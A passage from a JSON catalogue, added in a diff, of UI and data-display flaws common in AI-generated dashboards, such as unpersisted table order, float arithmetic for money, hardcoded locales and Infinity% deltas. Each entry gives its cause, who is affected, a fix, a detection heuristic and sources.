+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "arrangements-that-forget",
+  "name": "Arrangements That Forget",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Tables",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "You drag rows into order and hide columns, and it all resets on reload.",
+  "looksLike": "The table has drag handles on every row and a 'Customize Columns' menu. Reordering is smooth and satisfying. Refresh the page and the order and hidden columns are back to the defaults, with no message.",
+  "why": "The dashboard block keeps row order in local React state with arrayMove and never persists it. Models copy the interaction because it demos well and do not ask where the arrangement should live.",
+  "who": "People who spend time organising work lose it silently and stop trusting the controls.",
+  "theFix": "Persist order and view settings to the server or at least to the user's preferences, or remove the drag handles. Ask the tool what happens to each control's state on reload.",
+  "heur": "Reorder rows and hide a column, reload, and compare.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/data-table.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/data-table.tsx"
+   }
+  ],
+  "code": "B201",
+  "rel": [
+   "select-all-then-nothing",
+   "the-unsortable-table",
+   "blank-page-no-instructions"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "floating-point-money",
+  "name": "Floating-Point Money",
+  "track": "surface",
+  "group": "Money",
+  "category": "Dashboard",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "Totals are summed as JavaScript floats, so amounts show stray decimals or drift by a cent.",
+  "looksLike": "An invoice total reads $1,234.5 or $0.30000000000000004. Row amounts add up to one cent more or less than the total. Rounding happens in different places on different screens.",
+  "why": "Generated code stores prices as decimal numbers and totals them with a plain reduce, because that is the shortest correct-looking code. Floats cannot represent most cents exactly, and formatting only hides the error on display.",
+  "who": "Customers and accountants lose trust when invoices do not add up, and small errors compound in payouts.",
+  "theFix": "Store money as integer minor units or use a money library, and format with Intl.NumberFormat using the right currency. Tell the tool never to use float arithmetic for money.",
+  "heur": "Grep for reduce over price or amount fields without integer conversion, and check rendered totals against row sums.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Currency Calculations in JavaScript",
+    "u": "https://www.honeybadger.io/blog/currency-money-calculations-in-javascript/"
+   }
+  ],
+  "code": "A194",
+  "rel": [
+   "hardcoded-en-us",
+   "infinity-percent",
+   "the-frozen-today"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "gradient-under-every-line",
+  "name": "Gradient Under Every Line",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Charts",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Every trend is a stacked area with a fading gradient fill, so one series reads as the total.",
+  "looksLike": "Two series, say Desktop and Mobile, are drawn as soft gradient areas stacked on top of each other. The top edge looks like the second series but is actually the sum. Lines that are not totals get filled like volumes.",
+  "why": "The interactive area chart example stacks its series with stackId and fills them with linear gradients, and generated dashboards reuse it as the default trend chart. Critics of generated dashboards name gradient fills under the line as a recurring tell.",
+  "who": "Readers misread the size of each series and compare stacked tops as if they were separate lines.",
+  "theFix": "Use plain lines for trends, and stack areas only for parts of a whole with a clear label saying so.",
+  "heur": "Grep for stackId on Area components and for linearGradient defs in chart files.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/chart-area-interactive.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/chart-area-interactive.tsx"
+   },
+   {
+    "t": "Why AI-generated dashboards all look the same · and the density fix",
+    "u": "https://uxskill.laithjunaidy.com/blog/ai-dashboard-design-generic.html"
+   }
+  ],
+  "code": "A195",
+  "rel": [
+   "natural-curve-fiction",
+   "one-colour-per-bar",
+   "the-3-3-dashed-grid"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "hardcoded-en-us",
+  "name": "Hardcoded en-US",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Dashboard",
+  "harm": "Clarity",
+  "origin": "Training data",
+  "oneLiner": "Dates, numbers and money are formatted as US English and dollars for every user.",
+  "looksLike": "A user in Germany sees 'Apr 1' axis labels, 4/1/2024 dates and $ amounts for a euro account. Decimal and thousand separators are US style. The browser locale is ignored.",
+  "why": "Example chart code passes \"en-US\" explicitly to toLocaleDateString, and training data is dominated by US formats and dollar signs. Models copy the literal locale instead of letting the user's locale apply.",
+  "who": "International users misread dates such as 04/05 and amounts, which causes real billing and scheduling errors.",
+  "theFix": "Omit the locale or pass the user's chosen locale, and format money with the account's currency code. Tell the tool to grep for 'en-US' and '$' literals.",
+  "heur": "Grep for toLocaleDateString(\"en-US\" and string literals beginning with '$' next to numbers.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/chart-area-interactive.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/chart-area-interactive.tsx"
+   },
+   {
+    "t": "Date.prototype.toLocaleDateString() - JavaScript | MDN",
+    "u": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toLocaleDateString"
+   }
+  ],
+  "code": "A196",
+  "rel": [
+   "the-unanchored-delta",
+   "floating-point-money",
+   "the-frozen-today"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "infinity-percent",
+  "name": "Infinity Percent",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Dashboard",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "A KPI delta reads Infinity%, NaN% or +100% because last period was zero.",
+  "looksLike": "A new account's stat card says 'Revenue $240, +Infinity% from last month', or the badge shows 'NaN%'. Sometimes the code clamps it to a cheerful +100%. Negative bases flip the sign, so a smaller loss shows as a decrease.",
+  "why": "Generated KPI code computes (current - previous) / previous * 100 inline, with no guard for zero or negative baselines, because demo data never contains zero. Even mature analytics code has shipped this bug.",
+  "who": "New users, who always have a zero baseline, get a broken or fake-looking first impression.",
+  "theFix": "Return null when the baseline is zero and show 'New' or a dash. Tell the tool to handle zero, negative and missing baselines in every delta.",
+  "heur": "Seed an account with zero prior data and look for Infinity, NaN or +100% on stat cards.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Five percentage-change bugs I've shipped to production",
+    "u": "https://dev.to/hqqqqy/five-percentage-change-bugs-ive-shipped-to-production-4f8f"
+   },
+   {
+    "t": "Return NULL from rate metrics when the denominator is zero (!256642)",
+    "u": "https://gitlab.com/gitlab-org/gitlab/-/merge_requests/256642"
+   }
+  ],
+  "code": "A197",
+  "rel": [
+   "the-scripted-trend-caption",
+   "the-unanchored-delta",
+   "two-revenues"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "mobile-gets-seven-days",
+  "name": "Mobile Gets Seven Days",
+  "track": "behavioral",
+  "group": "Transparency",
+  "category": "Mobile",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "On a phone, the chart silently switches to a shorter time range than on desktop.",
+  "looksLike": "On a laptop the chart shows three months. On a phone the same page shows the last seven days, and the toggle that explains it is hidden behind a select. Two people looking at 'the dashboard' see different trends.",
+  "why": "The interactive chart example uses an isMobile hook to force the range to 7 days on small screens. Models keep the effect because it makes the narrow chart look tidy.",
+  "who": "Mobile users draw conclusions from a week of data while thinking it is the default view.",
+  "theFix": "Keep the same default range on all screen sizes and change density, not data. If the range must differ, label it clearly in the chart title.",
+  "heur": "Grep for useIsMobile or matchMedia inside chart components that set a time range.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/chart-area-interactive.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/chart-area-interactive.tsx"
+   }
+  ],
+  "code": "B202",
+  "rel": [
+   "frozen-type-size",
+   "the-key-in-the-bundle",
+   "the-rectangular-phone"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "natural-curve-fiction",
+  "name": "Natural Curve Fiction",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Charts",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Line and area charts are drawn with smoothed curves that invent peaks and values between points.",
+  "looksLike": "Monthly figures are joined by soft, wavy lines that bulge above the highest real value and dip below the lowest. A count that cannot be negative appears to dip under zero between two months. The six points look like a continuous signal.",
+  "why": "The charting library defaults to straight linear segments, but the popular chart examples set type=\"natural\" on every line and area, and models copy that prop. Smoothing looks polished in a screenshot, which is what generation optimises for.",
+  "who": "Readers misjudge highs, lows and timing, which matters in finance, operations and health data.",
+  "theFix": "Use type=\"linear\" or \"monotone\" for business data and show point markers. Tell the tool: never use natural or basis curves on discrete measurements.",
+  "heur": "Grep chart components for type=\"natural\" or type=\"basis\" on Line or Area.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: charts/chart-line-default.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/charts/chart-line-default.tsx"
+   },
+   {
+    "t": "recharts/recharts source: src/cartesian/Area.tsx",
+    "u": "https://github.com/recharts/recharts/blob/main/src/cartesian/Area.tsx"
+   },
+   {
+    "t": "Are “smoothed” line charts OK?",
+    "u": "https://www.goodreads.com/author_blog_posts/24508598-are-smoothed-line-charts-ok?tab=book"
+   }
+  ],
+  "code": "A198",
+  "rel": [
+   "gradient-under-every-line",
+   "the-many-slice-donut",
+   "the-chart-with-no-words"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "one-colour-per-bar",
+  "name": "One Colour Per Bar",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Charts",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Each bar in a single-series bar chart gets its own palette colour for no reason.",
+  "looksLike": "Five bars, one per category, are painted in chart-1 through chart-5. The category names are already on the axis, so the colours carry no extra meaning. Readers hunt for a legend or assume the colours encode something.",
+  "why": "A mixed bar chart example assigns a fill per row from the five theme chart colours, and models reuse it whenever the data has categories. A rainbow looks richer in a preview than one calm colour.",
+  "who": "Colour-blind readers and anyone scanning quickly read meaning into colour that has none, and real highlights get lost.",
+  "theFix": "Use one colour for one series, and add a second colour only to highlight the bar that matters. Ask the tool to justify every colour in a chart.",
+  "heur": "Flag bar charts where each data row has its own fill but there is only one dataKey.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: charts/chart-bar-mixed.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/charts/chart-bar-mixed.tsx"
+   },
+   {
+    "t": "Dashboards: Making Charts and Graphs Easier to Understand",
+    "u": "https://www.nngroup.com/articles/dashboards-preattentive/"
+   }
+  ],
+  "code": "A199",
+  "rel": [
+   "gradient-under-every-line",
+   "the-3-3-dashed-grid",
+   "the-chart-with-no-words"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "select-all-then-nothing",
+  "name": "Select All, Then Nothing",
+  "track": "surface",
+  "group": "Components",
+  "category": "Tables",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "Every table row has a checkbox and a '0 of 10 row(s) selected' counter, but no bulk action exists.",
+  "looksLike": "A checkbox column sits on the left of the table with a select-all box in the header. Ticking rows updates a small 'n of N row(s) selected' line below. No toolbar appears and nothing can be done to the selection.",
+  "why": "The reference data table example includes row selection and the selected count as a feature demo, without any bulk action. Models reproduce the full example on every table because selection looks like capability.",
+  "who": "Users who select twenty rows expecting to export, delete or assign them waste the effort and then do it one row at a time.",
+  "theFix": "Add selection only where a bulk action exists, and show the actions as soon as one row is selected. Otherwise remove the checkbox column.",
+  "heur": "Select two rows in the rendered table and check whether any new action control appears.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Data Table - shadcn/ui",
+    "u": "https://ui.shadcn.com/docs/components/data-table"
+   },
+   {
+    "t": "How to design data tables that don't suck - the 20 rules guide",
+    "u": "https://www.mobilespoon.net/2019/11/design-ui-tables-20-rules-guide.html"
+   }
+  ],
+  "code": "A200",
+  "rel": [
+   "the-unsortable-table",
+   "arrow-on-every-button",
+   "arrangements-that-forget"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "shortcuts-nobody-wired",
+  "name": "Shortcuts Nobody Wired",
+  "track": "surface",
+  "group": "Components",
+  "category": "Navigation",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Menus show keyboard hints like ⇧⌘P and ⌘S that are plain text with no key handler.",
+  "looksLike": "The account menu lists Profile ⇧⌘P, Billing ⌘B, Settings ⌘S, Keyboard shortcuts ⌘K, New Team ⌘+T and Log out ⇧⌘Q. Pressing them does nothing in the app, and ⌘S, ⌘B and ⌘T trigger the browser's own save, bookmarks and new tab instead.",
+  "why": "The dropdown menu demo decorates items with a shortcut component that only renders text, and the docs describe it as a way to 'show keyboard hints'. Models copy the demo menu with its hints and do not add listeners, and they do not check the hints against browser shortcuts.",
+  "who": "Keyboard users and power users learn the app's hints are lies, and some get a browser save dialog instead of settings.",
+  "theFix": "Show a shortcut only if a handler is registered for it, and avoid combinations the browser already owns. Ask the tool to list each displayed shortcut and the code that handles it.",
+  "heur": "For each DropdownMenuShortcut or kbd text in the code, look for a matching keydown or hotkey registration; flag any without one.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: examples/dropdown-menu-demo.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/examples/dropdown-menu-demo.tsx"
+   },
+   {
+    "t": "Dropdown Menu - shadcn/ui",
+    "u": "https://ui.shadcn.com/docs/components/dropdown-menu"
+   }
+  ],
+  "code": "A201",
+  "rel": [
+   "the-crowded-tab-bar",
+   "coming-soon-navigation",
+   "search-that-s-just-filter"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "skeleton-of-another-page",
+  "name": "Skeleton Of Another Page",
+  "track": "surface",
+  "group": "Motion & performance",
+  "category": "States",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Grey shimmer boxes flash on every load, shaped nothing like the content that replaces them.",
+  "looksLike": "Each card, table and chart has its own shimmering skeleton, even for data that arrives in 200 ms. Three grey bars become a chart, a circle becomes a number, and the layout jumps when real content lands. Sometimes the skeleton stays when the request fails.",
+  "why": "Skeleton components are one import away, and models add a loading skeleton to every component as a sign of polish without matching it to the final layout. Guidance says skeletons suit full-page loads that take longer than a second and must mirror the real layout.",
+  "who": "Fast pages feel slower and jumpier, and failed loads look like endless loading.",
+  "theFix": "Show nothing for loads under a second, mirror the final layout when a skeleton is shown, and replace it with an error state on failure.",
+  "heur": "Throttle the network, record the load, and compare skeleton shapes and positions to the loaded content.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Skeleton Screens 101",
+    "u": "https://nngroup.com/articles/skeleton-screens/"
+   },
+   {
+    "t": "Effective Skeleton Screens",
+    "u": "https://timkadlec.com/remembers/2020/11/skeleton-screens/"
+   }
+  ],
+  "code": "A202",
+  "rel": [
+   "content-stuck-waiting-to-appear",
+   "blank-page-no-instructions",
+   "no-results-for-everything"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "test-mode-checkout",
+  "name": "Test-Mode Checkout",
+  "track": "behavioral",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Tool default",
+  "oneLiner": "The Upgrade button runs on payment test keys or test price IDs, so plans never change.",
+  "looksLike": "The billing settings page has a polished Upgrade to Pro button. Checkout shows a test-mode banner, or a real payment succeeds but the account stays on Free because the live webhook was never registered. Price IDs in code only exist in test mode.",
+  "why": "AI assistants write a working integration against test keys, but the switch to live depends on dashboard settings, new live webhooks and new price IDs that the assistant cannot see. Test objects do not carry over to live mode.",
+  "who": "Customers who pay do not get what they paid for, and founders lose revenue they think they are collecting.",
+  "theFix": "Swap to live keys, recreate products and prices in live mode, register a live webhook with its own secret, and make one real purchase end to end before launch.",
+  "heur": "Search the production bundle and env for pk_test_ or sk_test_, and check that the webhook endpoint exists in live mode.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Stripe Test Mode to Live Mode: The Pre-Launch Checklist for AI-Built Apps",
+    "u": "https://witscode.com/blogs/stripe-live-mode-checklist"
+   },
+   {
+    "t": "Payment Go-Live Checklist: Test Keys Out, Live Keys In",
+    "u": "https://axonbuild.com/blog/stripe-test-mode-to-live/"
+   }
+  ],
+  "code": "B203",
+  "rel": [
+   "the-missing-price-list",
+   "the-ai-surcharge",
+   "unlimited-until-it-isn-t"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-3-3-dashed-grid",
+  "name": "The 3 3 Dashed Grid",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Charts",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Every chart sits on the same grey dashed grid copied from the library's examples.",
+  "looksLike": "Horizontal and vertical dashed grey lines fill the plot area behind every chart, bar or line alike. The grid competes with thin data lines. Each chart in the app looks like the same documentation example.",
+  "why": "The chart library's own examples show the grid with strokeDasharray=\"3 3\", and models paste it into every chart. Research on chart flaws lists overuse of gridlines as a common defect.",
+  "who": "Readers spend attention on scaffolding instead of data, especially on small or dense charts.",
+  "theFix": "Drop vertical gridlines, keep a few light horizontal ones only when exact values matter, and let direct labels do the rest.",
+  "heur": "Grep for CartesianGrid strokeDasharray=\"3 3\" without vertical={false}.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "recharts/recharts source: src/cartesian/CartesianGrid.tsx",
+    "u": "https://github.com/recharts/recharts/blob/main/src/cartesian/CartesianGrid.tsx"
+   },
+   {
+    "t": "Automated Visualization Makeovers with LLMs",
+    "u": "https://arxiv.org/html/2508.05637v1"
+   }
+  ],
+  "code": "A203",
+  "rel": [
+   "gradient-under-every-line",
+   "one-colour-per-bar",
+   "the-chart-with-no-words"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-chart-with-no-words",
+  "name": "The Chart With No Words",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "Charts",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "A chart is an unlabelled SVG whose values exist only in a hover tooltip.",
+  "looksLike": "The dashboard's main insight is a line chart with no text summary, no title tied to the SVG and no table view. Values appear only on mouse hover. A screen reader announces 'graphic' or nothing.",
+  "why": "Generated charts copy the visual parts of examples and skip the accessibility layer, title and summary, which older chart library versions left off by default. Nothing in a screenshot reveals the gap.",
+  "who": "Blind and low-vision users, and keyboard users, cannot get the information the chart exists to give.",
+  "theFix": "Give each chart a text summary of its key finding, a data table alternative, and keyboard access to points. Tell the tool to add an aria-describedby summary and a 'View as table' toggle.",
+  "heur": "Inspect each chart SVG for an accessible name and description, and tab to it to see whether points can be reached.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Accessibility and charts: what should it do? #4484",
+    "u": "https://github.com/recharts/recharts/discussions/4484"
+   },
+   {
+    "t": "So machen Sie interaktive Diagramme barrierefrei",
+    "u": "https://www.deque.com/de/blog/how-to-make-interactive-charts-accessible/"
+   }
+  ],
+  "code": "A204",
+  "rel": [
+   "natural-curve-fiction",
+   "gradient-under-every-line",
+   "one-colour-per-bar"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-frozen-today",
+  "name": "The Frozen Today",
+  "track": "behavioral",
+  "group": "Input & feedback",
+  "category": "Dashboard",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "'Last 30 days' is counted back from a hardcoded date, and date pickers open on January 2022.",
+  "looksLike": "The range toggle says Last 3 months, Last 30 days, Last 7 days, but the filter subtracts days from a fixed '2024-06-30'. With real data, recent records fall outside every range or the chart goes empty. The date range picker opens preset to Jan 20 to Feb 9, 2022.",
+  "why": "The interactive area chart example filters against a literal reference date so its static demo data always shows something, and the range picker example initialises with new Date(2022, 0, 20). Models copy the filter logic intact when they swap in real data.",
+  "who": "Anyone filtering by recent dates sees wrong or empty results and has no clue why.",
+  "theFix": "Replace the reference date with the current date in the user's time zone, and default pickers to a relative range such as the last 30 days. Ask the tool to grep for new Date with a literal argument.",
+  "heur": "Grep for new Date(\"20 or new Date(20 with numeric literals inside filter or picker components.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/chart-area-interactive.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/chart-area-interactive.tsx"
+   },
+   {
+    "t": "shadcn-ui/ui source: examples/date-picker-with-range.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/examples/date-picker-with-range.tsx"
+   }
+  ],
+  "code": "B204",
+  "rel": [
+   "hardcoded-en-us",
+   "infinity-percent",
+   "floating-point-money"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-many-slice-donut",
+  "name": "The Many-Slice Donut",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Charts",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "A donut with a big total in the hole and five or more similar slices nobody can compare.",
+  "looksLike": "A ring chart labelled 'Traffic sources' or 'Revenue by plan' with a large number in the centre. Five to ten slices of similar size in neighbouring colours, with a legend underneath. You cannot tell whether slice three is bigger than slice five.",
+  "why": "Donut-with-centre-text is a staple of component chart galleries and generated dashboard layouts, so models reach for it whenever data is split into parts. Research on chart flaws lists too many slices as a common defect, and dashboard guidance rates donuts below pies.",
+  "who": "Decision makers cannot rank categories, so the chart takes space and answers nothing.",
+  "theFix": "Use a sorted horizontal bar chart for more than two or three parts. Keep a pie only for one dominant share against the rest.",
+  "heur": "Count slices in any Pie with innerRadius set; flag more than three.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Dashboards: Making Charts and Graphs Easier to Understand",
+    "u": "https://www.nngroup.com/articles/dashboards-preattentive/"
+   },
+   {
+    "t": "Automated Visualization Makeovers with LLMs",
+    "u": "https://arxiv.org/html/2508.05637v1"
+   },
+   {
+    "t": "shadcn-ui/ui source: charts/chart-pie-donut-text.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/charts/chart-pie-donut-text.tsx"
+   }
+  ],
+  "code": "A205",
+  "rel": [
+   "natural-curve-fiction",
+   "gradient-under-every-line",
+   "the-chart-with-no-words"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-scripted-trend-caption",
+  "name": "The Scripted Trend Caption",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Dashboard",
+  "harm": "Trust",
+  "origin": "Tool default",
+  "oneLiner": "Chart and KPI captions announce a trend in fixed text that no data ever computed.",
+  "looksLike": "Under every chart sits 'Trending up by 5.2% this month' with an up arrow, whatever the line does. KPI cards carry verdicts like 'Strong user retention', 'Engagement exceed targets' or 'Acquisition needs attention'. Under 'Total Revenue' the caption reads 'Visitors for the last 6 months'.",
+  "why": "Example chart cards and stat cards in common dashboard blocks hardcode their footer sentences as literal strings. When the model connects real data, it updates the number but not the prose, which looks finished and throws no error.",
+  "who": "Managers act on a reassuring sentence that contradicts the chart above it, and the first person to notice stops trusting the whole dashboard.",
+  "theFix": "Either compute captions from the same data as the chart (direction, size, period) or delete them. Tell the tool: no static sentence may describe a trend.",
+  "heur": "Find string literals containing 'Trending', 'up by', 'down', '%' or 'this month' inside chart or card footer components with no variable interpolation.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "shadcn-ui/ui source: charts/chart-line-default.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/charts/chart-line-default.tsx"
+   },
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/section-cards.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/section-cards.tsx"
+   }
+  ],
+  "code": "A206",
+  "rel": [
+   "two-revenues",
+   "infinity-percent",
+   "prompt-as-alt-text"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-unanchored-delta",
+  "name": "The Unanchored Delta",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Dashboard",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "A green '+12.5%' badge on a KPI card with no period, baseline or unit.",
+  "looksLike": "Every stat card has a small badge, +12.5% or -20%, with an arrow. Nothing says compared with what. 'Growth Rate 4.5%' carries a '+4.5%' badge, so you cannot tell if that is percent or percentage points. Increases are green even on cost or churn.",
+  "why": "Generated dashboards follow one card recipe: big number, tiny label, a delta in green or red. The starter cards hardcode deltas and arrows without a comparison period, and models fill the slot because the layout has one.",
+  "who": "Readers compare unlike things and celebrate or panic over numbers they cannot interpret.",
+  "theFix": "State the comparison on the card ('vs previous 30 days'), say 'pts' for rate changes, and colour by whether the change is good for that metric, not by its sign.",
+  "heur": "For each delta on screen, check that a period and unit are visible and that colour matches the metric's direction of good.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Why AI-generated dashboards all look the same · and the density fix",
+    "u": "https://uxskill.laithjunaidy.com/blog/ai-dashboard-design-generic.html"
+   },
+   {
+    "t": "shadcn-ui/ui source: blocks/dashboard-01/components/section-cards.tsx",
+    "u": "https://github.com/shadcn-ui/ui/blob/main/apps/v4/registry/new-york-v4/blocks/dashboard-01/components/section-cards.tsx"
+   },
+   {
+    "t": "Five percentage-change bugs I've shipped to production",
+    "u": "https://dev.to/hqqqqy/five-percentage-change-bugs-ive-shipped-to-production-4f8f"
+   }
+  ],
+  "code": "A207",
+  "rel": [
+   "hardcoded-en-us",
+   "infinity-percent",
+   "floating-point-money"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-unsortable-table",
+  "name": "The Unsortable Table",
+  "track": "surface",
+  "group": "Components",
+  "category": "Tables",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "A data table with static headers, left-aligned numbers and no way to sort.",
+  "looksLike": "The customers table has twelve columns, zebra stripes and default row height. Clicking a header does nothing. Amounts are left-aligned, so you cannot compare them by eye, and the header scrolls away.",
+  "why": "Generated dashboards end with 'a table below it with default row height and zebra striping'. Models render rows from an array and skip sorting, numeric alignment and sticky headers, because none of that shows in a static preview.",
+  "who": "Operators who live in the table cannot find the biggest, oldest or newest record without exporting to a spreadsheet.",
+  "theFix": "Make key columns sortable with a visible sort state, right-align numbers, and pin the header. Tell the tool which columns people sort by.",
+  "heur": "Click each column header in the rendered table and check alignment of numeric columns.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to design data tables that don't suck - the 20 rules guide",
+    "u": "https://www.mobilespoon.net/2019/11/design-ui-tables-20-rules-guide.html"
+   },
+   {
+    "t": "Why AI-generated dashboards all look the same · and the density fix",
+    "u": "https://uxskill.laithjunaidy.com/blog/ai-dashboard-design-generic.html"
+   }
+  ],
+  "code": "A208",
+  "rel": [
+   "select-all-then-nothing",
+   "arrangements-that-forget",
+   "the-accent-stripe"
+  ],
+  "tier": "needed",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-zero-height-chart",
+  "name": "The Zero-Height Chart",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Charts",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "The chart card renders as an empty box because the chart's container has no height.",
